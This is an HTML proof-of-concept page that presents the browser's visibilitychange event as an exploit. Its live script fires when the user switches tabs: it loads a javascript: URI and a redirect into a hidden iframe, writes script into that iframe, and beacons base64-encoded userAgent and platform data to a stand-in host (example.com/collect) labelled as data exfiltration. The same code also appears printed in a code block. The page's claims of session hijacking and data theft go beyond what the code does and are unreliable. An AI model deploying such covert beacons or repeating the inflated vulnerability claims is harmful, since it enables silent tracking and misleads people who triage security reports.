<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced PoC: visibilitychange Exploit</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        
        .header {
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            margin-bottom: 25px;
            text-align: center;
        }
        
        h1 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 2.5rem;
        }
        
        .subtitle {
            color: #7f8c8d;
            font-size: 1.2rem;
            margin-bottom: 20px;
        }
        
        .card {
            background: white;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            margin-bottom: 25px;
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }
        
        .warning-icon {
            font-size: 24px;
            margin-right: 15px;
            color: #f39c12;
        }
        
        .test-area {
            border: 2px dashed #3498db;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            background: #f8f9fa;
            text-align: center;
        }
        
        .status-indicator {
            padding: 10px;
            border-radius: 5px;
            margin: 15px 0;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .status-active {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status-exploit {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
        
        button {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
        }
        
        button:hover {
            background: #2980b9;
            transform: translateY(-2px);
            box-shadow: 0 7px 14px rgba(50, 50, 93, 0.1), 0 3px 6px rgba(0, 0, 0, 0.08);
        }
        
        .exploit-log {
            background: #2c3e50;
            color: #ecf0f1;
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
            font-family: 'Courier New', monospace;
            max-height: 200px;
            overflow-y: auto;
            text-align: left;
        }
        
        .log-entry {
            margin-bottom: 5px;
            padding: 5px;
            border-bottom: 1px solid #34495e;
        }
        
        .log-time {
            color: #3498db;
        }
        
        .vectors-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .vector-card {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            border-left: 4px solid #3498db;
        }
        
        .vector-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #2c3e50;
        }
        
        .impact-list {
            padding-left: 20px;
            margin: 15px 0;
        }
        
        .impact-list li {
            margin-bottom: 8px;
            position: relative;
        }
        
        .impact-list li:before {
            content: "•";
            color: #3498db;
            font-weight: bold;
            display: inline-block;
            width: 1em;
            margin-left: -1em;
        }
        
        .code-block {
            background: #f8f9fa;
            border-left: 4px solid #e74c3c;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            overflow-x: auto;
            border-radius: 0 5px 5px 0;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: white;
            font-size: 0.9rem;
        }
        
        .tab-simulation {
            background: #34495e;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin: 15px 0;
            cursor: pointer;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Enhanced PoC: visibilitychange Exploit</h1>
            <p class="subtitle">Demonstrating how the visibilitychange event can be exploited</p>
        </div>
        
        <div class="card">
            <div class="warning">
                <div class="warning-icon">⚠️</div>
                <div>
                    <strong>Security Notice:</strong> This proof of concept is for educational and security testing purposes only. 
                    Do not use for malicious activities.
                </div>
            </div>
            
            <h2>Exploit Demonstration</h2>
            <p>The code below exploits the <code>visibilitychange</code> event to execute malicious code when the user switches tabs or minimizes the browser window.</p>
            
            <div class="test-area">
                <h3>Test Area</h3>
                <p>Switch tabs or minimize the window to trigger the exploit:</p>
                
                <button id="testButton">Click to Focus</button>
                <div class="tab-simulation" id="simulateTabSwitch">Simulate Tab Switch</div>
                
                <div id="status" class="status-indicator status-active">
                    Status: Page Active
                </div>
                
                <div class="exploit-log" id="log">
                    <div class="log-entry"><span class="log-time">[System]</span> Exploit logger initialized</div>
                </div>
            </div>
            
            <!-- Hidden iframe for exploitation -->
            <iframe id="exploitFrame" name="exploitFrame" style="width:0;height:0;border:0;visibility:hidden"></iframe>
        </div>
        
        <div class="card">
            <h2>Exploit Vectors</h2>
            <p>The enhanced PoC implements multiple exploitation techniques:</p>
            
            <div class="vectors-grid">
                <div class="vector-card">
                    <div class="vector-title">JavaScript URI Execution</div>
                    <p>Executes JavaScript directly through iframe src attribute</p>
                </div>
                
                <div class="vector-card">
                    <div class="vector-title">Silent Redirect</div>
                    <p>Redirects iframe to external URLs without user interaction</p>
                </div>
                
                <div class="vector-card">
                    <div class="vector-title">DOM Manipulation</div>
                    <p>Attempts to manipulate iframe content directly</p>
                </div>
                
                <div class="vector-card">
                    <div class="vector-title">Data Exfiltration</div>
                    <p>Simulates sending data to external server</p>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h2>Exploit Code</h2>
            <div class="code-block">
// Enhanced visibilitychange exploit
document.addEventListener('visibilitychange', function() {
    const frame = document.getElementById('exploitFrame');
    const status = document.getElementById('status');
    
    if (document.hidden) {
        // Update UI
        status.textContent = 'Status: Page Hidden - EXPLOIT TRIGGERED';
        status.className = 'status-indicator status-exploit';
        
        logEvent('Visibility change detected - page hidden');
        
        // Vector 1: JavaScript URI (may be blocked in some browsers)
        try {
            frame.src = "javascript:alert('SECURITY ISSUE: visibilitychange exploit executed!')";
            logEvent('Vector 1: JavaScript URI executed');
        } catch(e) {
            logEvent('Vector 1 failed: ' + e.message);
        }
        
        // Vector 2: Redirect to external URL
        setTimeout(() => {
            try {
                frame.src = "https://example.com?exploit=visibilitychange&data=" + btoa(navigator.userAgent);
                logEvent('Vector 2: External redirect attempted');
            } catch(e) {
                logEvent('Vector 2 failed: ' + e.message);
            }
        }, 100);
        
        // Vector 3: DOM manipulation attempt
        setTimeout(() => {
            try {
                const iframeDoc = frame.contentDocument || frame.contentWindow.document;
                iframeDoc.open();
                iframeDoc.write('&lt;script&gt;console.log("DOM manipulated via visibilitychange")&lt;/script&gt;');
                iframeDoc.close();
                logEvent('Vector 3: DOM manipulation attempted');
            } catch(e) {
                logEvent('Vector 3 failed (SOP restriction): ' + e.message);
            }
        }, 200);
        
        // Vector 4: Simulate data exfiltration
        setTimeout(() => {
            try {
                // In a real exploit, this would send data to attacker's server
                const exploitImage = new Image();
                exploitImage.src = 'https://example.com/collect?data=' + btoa(JSON.stringify({
                    exploit: 'visibilitychange',
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                }));
                logEvent('Vector 4: Data exfiltration simulated');
            } catch(e) {
                logEvent('Vector 4 failed: ' + e.message);
            }
        }, 300);
        
    } else {
        // Page is visible again
        status.textContent = 'Status: Page Active';
        status.className = 'status-indicator status-active';
        logEvent('Page visible again');
    }
});

// Additional detection methods
window.addEventListener('blur', function() {
    logEvent('Window blur event detected');
});

window.addEventListener('focus', function() {
    logEvent('Window focus event detected');
});

// Logging function
function logEvent(message) {
    const log = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
    log.appendChild(entry);
    log.scrollTop = log.scrollHeight;
}
            </div>
        </div>
        
        <div class="card">
            <h2>Security Impact</h2>
            <ul class="impact-list">
                <li><strong>Stealth Execution:</strong> Code runs without user knowledge when they switch tabs</li>
                <li><strong>Multiple Attack Vectors:</strong> Various methods to execute malicious code</li>
                <li><strong>Data Exfiltration:</strong> Potential to steal user data and browser information</li>
                <li><strong>Phishing:</strong> Could redirect to fake login pages</li>
                <li><strong>Session Hijacking:</strong> Potential to steal active sessions</li>
            </ul>
            
            <h3>Recommendations for Bug Reporting</h3>
            <ul class="impact-list">
                <li>Test across multiple browsers (Chrome, Firefox, Safari, Edge)</li>
                <li>Check for Content Security Policy (CSP) mitigations</li>
                <li>Document clear reproduction steps</li>
                <li>Include real-world attack scenarios</li>
                <li>Demonstrate actual impact (data theft, phishing, etc.)</li>
            </ul>
        </div>
        
        <div class="footer">
            <p>Enhanced PoC for visibilitychange Exploit | For Security Research Purposes Only</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const status = document.getElementById('status');
            const testButton = document.getElementById('testButton');
            const simulateTabSwitch = document.getElementById('simulateTabSwitch');
            
            // Logging function
            function logEvent(message) {
                const log = document.getElementById('log');
                const time = new Date().toLocaleTimeString();
                const entry = document.createElement('div');
                entry.className = 'log-entry';
                entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
                log.appendChild(entry);
                log.scrollTop = log.scrollHeight;
            }
            
            // Enhanced visibilitychange exploit
            document.addEventListener('visibilitychange', function() {
                const frame = document.getElementById('exploitFrame');
                
                if (document.hidden) {
                    // Update UI
                    status.textContent = 'Status: Page Hidden - EXPLOIT TRIGGERED';
                    status.className = 'status-indicator status-exploit';
                    
                    logEvent('Visibility change detected - page hidden');
                    
                    // Vector 1: JavaScript URI (may be blocked in some browsers)
                    try {
                        frame.src = "javascript:alert('SECURITY ISSUE: visibilitychange exploit executed!')";
                        logEvent('Vector 1: JavaScript URI executed');
                    } catch(e) {
                        logEvent('Vector 1 failed: ' + e.message);
                    }
                    
                    // Vector 2: Redirect to external URL
                    setTimeout(() => {
                        try {
                            frame.src = "https://example.com?exploit=visibilitychange&data=" + btoa(navigator.userAgent);
                            logEvent('Vector 2: External redirect attempted');
                        } catch(e) {
                            logEvent('Vector 2 failed: ' + e.message);
                        }
                    }, 100);
                    
                    // Vector 3: DOM manipulation attempt
                    setTimeout(() => {
                        try {
                            const iframeDoc = frame.contentDocument || frame.contentWindow.document;
                            iframeDoc.open();
                            iframeDoc.write('<script>console.log("DOM manipulated via visibilitychange")</script>');
                            iframeDoc.close();
                            logEvent('Vector 3: DOM manipulation attempted');
                        } catch(e) {
                            logEvent('Vector 3 failed (SOP restriction): ' + e.message);
                        }
                    }, 200);
                    
                    // Vector 4: Simulate data exfiltration
                    setTimeout(() => {
                        try {
                            // In a real exploit, this would send data to attacker's server
                            const exploitImage = new Image();
                            exploitImage.src = 'https://example.com/collect?data=' + btoa(JSON.stringify({
                                exploit: 'visibilitychange',
                                timestamp: Date.now(),
                                userAgent: navigator.userAgent,
                                platform: navigator.platform
                            }));
                            logEvent('Vector 4: Data exfiltration simulated');
                        } catch(e) {
                            logEvent('Vector 4 failed: ' + e.message);
                        }
                    }, 300);
                    
                } else {
                    // Page is visible again
                    status.textContent = 'Status: Page Active';
                    status.className = 'status-indicator status-active';
                    logEvent('Page visible again');
                }
            });
            
            // Additional detection methods
            window.addEventListener('blur', function() {
                logEvent('Window blur event detected');
            });
            
            window.addEventListener('focus', function() {
                logEvent('Window focus event detected');
            });
            
            // Test button
            testButton.addEventListener('click', function() {
                alert('Now switch tabs or minimize the window to test the exploit');
                logEvent('Test button clicked');
            });
            
            // Simulate tab switch for testing
            simulateTabSwitch.addEventListener('click', function() {
                logEvent('Tab switch simulation triggered');
                // Create a fake visibility change event
                const event = new Event('visibilitychange');
                document.dispatchEvent(event);
            });
            
            // Initial log
            logEvent('Enhanced PoC loaded successfully');
        });
    </script>
</body>
</html>
